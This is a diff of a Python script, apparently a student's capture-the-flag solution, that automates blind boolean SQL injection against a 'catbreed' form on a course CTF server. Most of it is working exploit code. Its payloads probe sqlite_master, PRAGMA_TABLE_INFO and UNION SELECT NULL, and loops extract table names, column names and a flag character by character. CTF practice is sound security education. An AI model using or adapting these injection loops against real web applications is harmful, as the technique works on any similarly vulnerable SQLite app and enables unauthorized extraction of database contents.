@@ -10,8 +10,8 @@ import textwrap
 import requests
 import re
 
-url = 'http://127.0.0.1:8889/'
-#url = 'http://cs2107-ctfd-i.comp.nus.edu.sg:8083/'
+#url = 'http://127.0.0.1:8889/'
+url = 'http://cs2107-ctfd-i.comp.nus.edu.sg:8083/'
 post_form = 'catbreed'
 headers = {
         'referrer': url + post_form,
@@ -33,72 +33,140 @@ def testSqli():
     print(match)
     print('[!] Completed!')
 
-def getTableName():
+def getTableName(end_offset, est_table_count):
     table_dirty = []
     table_clean = []
 
     print('[*] Start...')
 
-    for offset in range(1, 14):
-        for dec_number in range(32, 127):
-            data = {
-                # first column
-                #'breed': "' OR UNICODE(SUBSTR((SELECT name FROM sqlite_master WHERE type='table'), " + str(offset) + ", 1)) < " + str(dec_number) + " --"
+    if (int(est_table_count) == 0):
+        print('You think you funny?')
+        exit
+    elif (int(est_table_count) == 1):
+        limit = '1'
+        for offset in range(0, int(end_offset)):
+            for dec_number in range(32, 127):
+                data = {
+                    'breed': "' OR UNICODE(SUBSTR((SELECT name FROM sqlite_master WHERE type='table' LIMIT " + limit + "), " + str(offset) + ", 1)) < " + str(dec_number) + " --"
+                }
 
-                # second column
-                'breed': "' OR UNICODE(SUBSTR((SELECT name FROM sqlite_master WHERE type='table' LIMIT 1, 1), " + str(offset) + ", 1)) < " + str(dec_number) + " --"
-            }
+                response = requests.post(url + post_form, headers=headers, data=data)
+                match = re.search(success_regex, response.text)
 
-            response = requests.post(url + post_form, headers=headers, data=data)
-            match = re.search(success_regex, response.text)
+                if match:
+                    table_dirty.append(dec_number - 1)
+                    break
 
-            if match:
-                table_dirty.append(dec_number - 1)
-                break
+        for char in table_dirty:
+            table_clean.append(chr(char))
 
-    for char in table_dirty:
-        table_clean.append(chr(char))
+        delimiter = ''
+        print(delimiter.join(table_clean))
+        print('[!] Completed!')
+    else:
+        for i in range(0, int(est_table_count)):
+            limit = ', 1'
 
-    delimiter = ''
-    print(delimiter.join(table_clean))
-    print('[!] Completed!')
+            for offset in range(1, int(end_offset)):
+                for dec_number in range(32, 127):
+                    data = {
+                        'breed': "' OR UNICODE(SUBSTR((SELECT name FROM sqlite_master WHERE type='table' LIMIT 1" + limit * i + "), " + str(offset) + ", 1)) < " + str(dec_number) + " --"
+                    }
 
-def getColumnsName(table_name):
+                    response = requests.post(url + post_form, headers=headers, data=data)
+                    match = re.search(success_regex, response.text)
+
+                    if match:
+                        if (offset == 1):
+                            table_dirty.append('|')
+                            table_dirty.append(dec_number - 1)
+                            break
+                        else:
+                            table_dirty.append(dec_number - 1)
+                            break
+
+        for char in table_dirty:
+            if (char == '|'):
+                table_clean.append(char)
+                continue
+            else:
+                table_clean.append(chr(char))
+
+        delimiter = ''
+
+        print(delimiter.join(table_clean))
+        print('[!] Completed!')
+
+def getColumnsName(table_name, end_offset, est_column_count):
     print('[*] Start...')
 
     column_dirty = []
     column_clean = []
 
-    for offset in range(1, 7):
-        for dec_number in range(32, 127):
-            data = {
-                # first column
-                #'breed': "' OR UNICODE(SUBSTR((SELECT name FROM PRAGMA_TABLE_INFO('" + table_name + "')), " + str(offset) + ", 1)) < " + str(dec_number) + " --"
+    if (int(est_column_count) == 0):
+        print('You think you funny?')
+        exit
+    elif (int(est_column_count) == 1):
+        limit = '1'
+        for offset in range(0, int(end_offset)):
+            for dec_number in range(32, 127):
+                data = {
+                    'breed': "' OR UNICODE(SUBSTR((SELECT name FROM PRAGMA_TABLE_INFO('" + table_name + "') LIMIT " + limit + "), " + str(offset) + ", 1)) < " + str(dec_number) + " --"
+                }
 
-                # second column
-                'breed': "' OR UNICODE(SUBSTR((SELECT name FROM PRAGMA_TABLE_INFO('" + table_name + "') LIMIT 1, 1), " + str(offset) + ", 1)) < " + str(dec_number) + " --"
-            }
+                response = requests.post(url + post_form, headers=headers, data=data)
+                match = re.search(success_regex, response.text)
 
-            response = requests.post(url + post_form, headers=headers, data=data)
-            match = re.search(success_regex, response.text)
+                if match:
+                    column_dirty.append(dec_number - 1)
+                    break
 
-            if match:
-                column_dirty.append(dec_number - 1)
-                break
+        for char in column_dirty:
+            column_clean.append(chr(char))
 
-    for char in column_dirty:
-        column_clean.append(chr(char))
+        delimiter = ''
+        print(delimiter.join(column_clean))
+        print('[!] Completed!')
+    else:
+        for i in range(0, int(est_column_count)):
+            limit = ', 1'
 
-    delimiter = ''
-    print(delimiter.join(column_clean))
-    print('[!] Completed!')
+            for offset in range(1, int(end_offset)):
+                    for dec_number in range(32, 127):
+                        data = {
+                            'breed': "' OR UNICODE(SUBSTR((SELECT name FROM PRAGMA_TABLE_INFO('" + table_name + "') LIMIT 1" + limit * i + "), " + str(offset) + ", 1)) < " + str(dec_number) + " --"
+                        }
+
+                        response = requests.post(url + post_form, headers=headers, data=data)
+                        match = re.search(success_regex, response.text)
+
+                        if match:
+                            if (offset == 1):
+                                column_dirty.append('|')
+                                column_dirty.append(dec_number - 1)
+                                break
+                            else:
+                                column_dirty.append(dec_number - 1)
+                                break
+
+        for char in column_dirty:
+            if (char == '|'):
+                column_clean.append(char)
+                continue
+            else:
+                column_clean.append(chr(char))
+
+        delimiter = ''
+
+        print(delimiter.join(column_clean))
+        print('[!] Completed!')
 
 def getColumns(null_count, db_name):
     print('[*] Start...')
 
-    for i in range(0, null_count):
+    for i in range(1, null_count):
         null = "NULL"
-        if (i == 0):
+        if (i == 1):
             data = {
                 "breed": "' UNION SELECT " + null + " FROM " + db_name + " WHERE type='table' --"
             }
@@ -116,13 +184,13 @@ def getColumns(null_count, db_name):
             print(f"Number of columns in {db_name}: {i}")
             print('[!] Completed!')
 
-def getFlag(table_name):
+def getFlag(table_name, end_offset):
     print('[*] Start...')
 
     flag_dirty = []
     flag_clean = []
 
-    for offset in range(1, 60):
+    for offset in range(1, int(end_offset)):
         for dec_number in range(32, 127):
             data = {
                     'breed': "' OR UNICODE(SUBSTR((SELECT " + table_name[:-1] + " FROM " + table_name + "), " + str(offset) + ", 1)) < " + str(dec_number) + " --"
@@ -146,17 +214,22 @@ def choice(option):
     if option == '1':
         testSqli()
     elif option == '2':
-        getTableName()
+        end_offset = input('Ending offset of the table name: ')
+        est_table_count = input('Guesstimate number of tables: ')
+        getTableName(end_offset=end_offset, est_table_count=est_table_count)
     elif option == '3':
         table_name = input('Table name: ')
-        getColumnsName(table_name=table_name)
+        end_offset = input('Ending offset of the column name: ')
+        est_column_count = input("Guesstimate number of columns: ")
+        getColumnsName(table_name=table_name, end_offset=end_offset, est_column_count=est_column_count)
     elif option == '4':
         null_count = input('Number of NULLs expected: ')
         db_name =  input('Database name: ')
         getColumns(null_count=int(null_count), db_name=db_name)
     elif option == '5':
         table_name = input('Table name: ')
-        getFlag(table_name=table_name)
+        end_offset = input('Ending offset of the flag: ')
+        getFlag(table_name=table_name, end_offset=end_offset)
 
 if __name__ == '__main__':
     parser = argparse.ArgumentParser(
@@ -178,10 +251,10 @@ if __name__ == '__main__':
         '--argument',
         help=textwrap.dedent('''
             1 - Vulnerability test (no argument needed)
-            2 - Get table name (no argument needed)
-            3 - Get column name (requires table_name)
+            2 - Get table name (requires end_offset, est_table_count)
+            3 - Get column name (requires table_name, end_offset, est_column_count)
             4 - Get number of columns (requires null_count, db_name)
-            5 - Get flag (requires table_name)
+            5 - Get flag (requires table_name, end_offset)
         '''),
         required=True
         )
